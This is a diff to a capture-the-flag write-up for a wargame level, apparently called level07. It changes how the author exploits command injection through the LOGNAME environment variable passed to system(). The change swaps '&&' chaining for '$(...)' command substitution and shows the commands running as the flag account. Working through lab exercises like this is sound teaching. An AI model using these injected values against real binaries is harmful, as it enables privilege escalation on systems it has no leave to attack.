@@ -49,21 +49,16 @@ system("/bin/echo hello") = 0
 
 ### Exploiting
 
-If we can execute arbitrary command, we will be able to get the flag! Maybe bash's AND (`&&`) operator?
+Using a sub-shell, we should be able to get the flag.
 
 ```bash
-$ LOGNAME="hello && id" ltrace ./level07
-getenv("LOGNAME") = "hello && id"
-asprintf(0xbffff734, 0x8048688, 0xbffff911, 0xb7e5ee55, 0xb7fed280) = 22
-system("/bin/echo hello && id") = 0
-hello
-uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
+$ LOGNAME='$(id)' ./level07
+uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
 ```
 
 Perfect! We should be able to get the flag:
 
 ```bash
-$ LOGNAME="hello && getflag" ./level07
-hello
+$ LOGNAME='$(getflag)' ./level07
 Check flag.Here is your token : ....
 ```
